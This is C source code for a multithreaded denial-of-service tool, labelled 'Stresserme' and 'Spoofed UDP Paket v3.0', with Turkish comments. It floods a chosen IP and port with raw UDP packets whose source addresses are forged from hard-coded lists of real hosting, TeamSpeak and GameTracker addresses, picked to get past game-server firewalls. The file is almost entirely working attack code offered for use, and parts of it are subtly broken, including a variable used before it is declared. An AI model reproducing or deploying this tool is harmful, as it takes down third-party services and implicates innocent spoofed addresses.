#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
 
#define MAX_PACKET_SIZE 4096
#define PHI 0x61C88647
 
static uint32_t Q[4096], c = 362436;
 
int karar;
 
 //Degiskenlere Dechimal Ile IP List Belirleme Bolumu By HasanAtilan
int ovh[3] = {1357890401, 1047760524, 1047755019};
int ts3[5] = {2151797366, 586754251, 778661953, 1572396061, 3261166083};
int digital[3] = {2180645716, 2180645524, 2180645730};
int gt[9] = {3500667326,3500667321,3500667322,3500667319,3500667325,1815957139,1815957140,1815957141,1815957142};
int vox[3] = {100550982, 100550665, 100563594};
int rand1[23] = {3500667326, 3500667321, 3500667322, 3500667319, 3500667325, 1815957139, 1815957140, 1815957141, 1815957142, 2180645730, 2180645524, 2180645716, 3261166083, 1572396061, 778661953, 586754251, 2151797366, 1357890401, 1047760524, 1047755019, 100550982, 100550665, 100563594};
 
int myArray[27000];
 
struct thread_data{
        int throttle;
	int thread_id;
	unsigned int floodport;
	struct sockaddr_in sin;
};
 
/* struct HasanAtilan{
//Degiskenlerden Cekilecek IP'Leri Random Cekme Bolumu
int ovhgame = ovh[rand()%3]; // OVH Fransa Datacenterine En Yakin Santral IPLeri.
int teamspeak3 = ts3[rand()%5]; // TeamSpeak3 Local IPLeri.
int digitalocean = digital[rand()%3]; // DigitalOcean VIP Firewall Bypass IP Leri.
int gametracker = gt[rand()%9]; // GameTracker Scanner Botlarin IPLeri.
int voxlty = vox[rand()%3]; // Yukardakilerin Hepsini Random Gonderir.
int karisik = rand1[rand()%23]; // Yukardakilerin Hepsini Random Gonderir.
}HasanAtilan; */
 
void init_rand(uint32_t x)
{
        int i;
 
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
 
        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
 
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4096;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4096;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
 
char *myStrCat (char *s, char *a) {
    while (*s != '\0') s++;
    while (*a != '\0') *s++ = *a++;
    *s = '\0';
    return s;
}
 
char *replStr (char *str, size_t count) {
    if (count == 0) return NULL;
    char *ret = malloc (strlen (str) * count + count);
    if (ret == NULL) return NULL;
    *ret = '\0';
    char *tmp = myStrCat (ret, str);
    while (--count > 0) {
        tmp = myStrCat (tmp, str);
    }
    return ret;
}
 
 

unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
  sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}
void setup_ip_header(struct iphdr *iph)
{
  iph->ihl = 5; // IHL Ayar Bolumu
  iph->version = 4; // IP Version Bolumu IPv4 & IPv6
  iph->tos = rand(); // TOS Bolumu (Type Of Service)
  iph->tot_len = sizeof(struct iphdr) + 30; // Total Lenght Bolumu IP Lenght
  iph->id = htonl(rand()%65535); // Windows Paket ID Bolumu.
  iph->frag_off = 0; // Fragmentation Ayar Bolumu.
  iph->ttl = rand(); // TTL Bolumu.
  iph->protocol = 17; // IP Protocol Bolumu.
  iph->check = 0; // Checksum Bolumu.
 
// 208.167.241.190 -->> 3500667326 (GameTracker)
// 208.167.241.185 -->> 3500667321 (GameTracker)
// 208.167.241.186 -->> 3500667322 (GameTracker)
// 208.167.241.183 -->> 3500667319 (GameTracker)
// 208.167.241.189 -->> 3500667325 (GameTracker)
// 108.61.78.147 -->> 1815957139 (GameTracker)
// 108.61.78.148 -->> 1815957140 (GameTracker)
// 108.61.78.149 -->> 1815957141 (GameTracker)
// 108.61.78.150 -->> 1815957142 (GameTracker)
// 129.250.3.98 -->> 2180645730 (Digital Ocean VIP FW Santral IP)
// 129.250.2.148 -->> 2180645524 (Digital Ocean VIP FW Santral IP)
// 129.250.3.84 -->> 2180645716 (Digital Ocean VIP FW Santral IP)
// 194.97.114.3 -->> 3261166083 (TeamSpeak3 Local IP)
// 93.184.220.29 -->> 1572396061 (TeamSpeak3 Local IP)
// 46.105.112.65 -->> 778661953 (TeamSpeak3 Local IP)
// 34.249.40.203 -->> 586754251 (TeamSpeak3 Local IP)
// 128.65.210.118 -->> 2151797366 (TeamSpeak3 Local IP)
// 80.239.195.97 -->> 1357890401 (OVH Game FW Santral IP)
// 62.115.142.140 -->> 1047760524 (OVH Game FW Santral IP)
// 62.115.121.11 -->> 1047755019 (OVH Game FW Santral IP)
// 5.254.73.70 -->> 100550982 (Voxilty Firewall IP)
// 5.254.72.9 -->> 100550665 (Voxilty Firewall IP)
// 5.254.122.138 -->> 100563594 (Voxilty Firewall IP)
 
// Source IP List Bolumu Sinir Yoktur Fakat IPLer Dechimal Ile Yazilmak Zorundadir.
 
 
  // Source IP Bolumu Bu Bolumun Calismasi Icın saddr Yani Spoof Ozellik Kapali Olmalidir.
  iph->saddr = htonl(karar); // Degiskenlerin Hangisini Kullanacagini Belirleme Bolumu.
}
 
// UDP Header Ayar Bolumu
void setup_udp_header(struct udphdr *udph)
{
  udph->source = htons(rand()%65535); // Source Port Bolumu
  udph->check = 0; // Checksum Bolumu
  char *data = (char *)udph + sizeof(struct udphdr); // Hex Paketinin Degiskenin Ayar Bolumu.
  data = replStr("\xFF" "\xFF" "\xFF" "\xFF", 256); // Hex Paketi Bolumu.
  udph->len=htons(30); // UDP Lenght Bolumu
}
 
// Saldiriyi Döngüye Ceviren Bolum.
void *flood(void *par1)
{
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
  struct sockaddr_in sin = td->sin;
  char new_ip[sizeof "255.255.255.255"];
 
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if(s < 0){
    fprintf(stderr, "Soket Olusturmada Sorun Olustu.\n");
    exit(-1);
  }
 
  unsigned int floodport = td->floodport;
 
  // Paket Temizleme
  memset(datagram, 0, MAX_PACKET_SIZE);
 
  // IPHeader Ve UDPHeader Degiskenlerinin Ayar Bolumu.
  setup_ip_header(iph);
  setup_udp_header(udph);
 
  // argv[2]'Ye Yazdigimiz Port "floodport" Degiskeninden Cekilerek Yazilir.
  udph->dest = htons(floodport);
 
  // Alttaki daddr Yani argv[1] e yazdigimiz komutlar "sin.sin_addr.s_addr" buraya gelir eger htonl(3500667326 + rand()%255);
  // Yazarsak Oraya Yazdigimiz Dechimal IP Sinin /8  Classinden 1-255'e Kadar Randomlayarak Vurur.
  iph->daddr = sin.sin_addr.s_addr;
  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
  iph->daddr = htonl(3112088066 + rand()%255);
 
  int tmp = 1;
  const int *val = &tmp;
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }
 
  int throttle = td->throttle;
 
  uint32_t random_num;
  uint32_t spoof;
  init_rand(time(NULL));
  if(throttle == 0){
    while(1){
      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
      random_num = rand_cmwc();
 
// Spoof Ayari spoof & ttnet By HasanAtilan
      spoof = (random_num >> 24 & 0xFF) << 24 |
               (random_num >> 16 & 0xFF) << 16 |
               (random_num >> 8 & 0xFF) << 8 |
               (random_num & 0xFF);
 
		long int ttnet = (myArray[rand()%27000]) + rand()%255;
		
	   // Alttaki saddr Bolumune "htonl(spoof);" Yazarsaniz Script Random IP Yollar.
	   // Alttaki saddr Bolumune "htonl(ttnet);" Yazarsaniz Script TTNET ASN IP Yollar.
      //iph->saddr = htonl(ttnet);
      udph->source = htons(random_num & 0xFFFF);
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    }
  } else {
    while(1){
      throttle = td->throttle;
      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
      random_num = rand_cmwc();
 
// Spoof Ayari spoof & ttnet By HasanAtilan
      ttnet = (random_num >> 24 & 0xFF) << 24 |
               (random_num >> 16 & 0xFF) << 16 |
               (random_num >> 8 & 0xFF) << 8 |
               (random_num & 0xFF);
 
		long int ttnet = (myArray[rand()%27000]) + rand()%255;
 
	   // Alttaki saddr Bolumune "htonl(spoof);" Yazarsaniz Script Random IP Yollar.
	   // Alttaki saddr Bolumune "htonl(ttnet);" Yazarsaniz Script TTNET ASN IP Yollar.
      //iph->saddr = htonl(ttnet);
      udph->source = htons(random_num & 0xFFFF);
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
 
     while(--throttle);
    }
  }
}
int main(int argc, char *argv[ ])
{
//TTNET Butun ASN IPlerini Cekme Bolumu By HasanAtilan
printf("    #Stresserme Script By HasanAtilan\n");
printf("TTNET ASN Numaralari Cekiliyor... \n");
 
//    int n =0 ;
//    char line[27000];
    
//    FILE *file;  
//    file = fopen("ttlist.txt", "r"); // ASN Numaralarini Cektigi Listi Okutma Bolumu
//    if (file != NULL)
//{
//   printf("TTNET ASN Kullanildi. \n");
//}
//   while(fgets(line, sizeof line, file)!=NULL) {   
//        myArray[n]=atoi(line); 
//        n++;
//   }
//
//    fclose(file);
 
  if(argc < 3){
    fprintf(stderr, "HasanAtilan UDP Multi Ayarlar\n");
   fprintf(stdout, "Spoofed UDP Paket v3.0 By HasanAtilan\nKullanım: %s <hedef IP> <Port> <ovh, ts3, digitalocean, gametracker, voxilty, karisik>\n", argv[0]);
   exit(-1);
  }
 
  fprintf(stdout, "IP'Ler Listelendi Yollamaya Hazirlaniyor...\n");
 
  int num_threads = 100;
  unsigned int floodport = atoi(argv[2]);
  pthread_t thread[num_threads];
  struct sockaddr_in sin;
 
  sin.sin_family = AF_INET;
  sin.sin_port = htons(floodport);
  sin.sin_addr.s_addr = inet_addr(argv[1]);
 
  struct thread_data td[num_threads];
 
	if(strstr(argv[3], "ovh"))
    karar = ovh[rand()%3];
	else
    printf("OVH Ayari Kapali!\n");
	if(strstr(argv[3], "ts3"))
    karar = ts3[rand()%5];
	else
    printf("TS3 Ayari Kapali!\n");
	if(strstr(argv[3], "digitalocean"))
    karar = digital[rand()%3];
	else
    printf("DigitalOcean Ayari Kapali!\n");
	if(strstr(argv[3], "gametracker"))
    karar = gt[rand()%9];
	else
    printf("GameTracker Ayari Kapali!\n");
	if(strstr(argv[3], "voxilty"))
    karar = vox[rand()%3];
	else
    printf("Voxilty Ayari Kapali!\n");
	if(strstr(argv[3], "karisik"))
    karar = rand1[rand()%23];
	else
    printf("Karisik Ayari Kapali!\n");
 
  int i;
  for(i = 0;i<num_threads;i++){
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].floodport = floodport;
    td[i].throttle = 100;
    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
  }
  fprintf(stdout, "IP'Ler Basari Ile Yollandi...\n");
  fprintf(stdout, "    #Stresserme Multi Options Script By Stresseme\n");
  if(argc > 5)
  {
    sleep(999);
  } else {
    while(1){
      sleep(1);
    }
  }
 
  return 0;
}
     
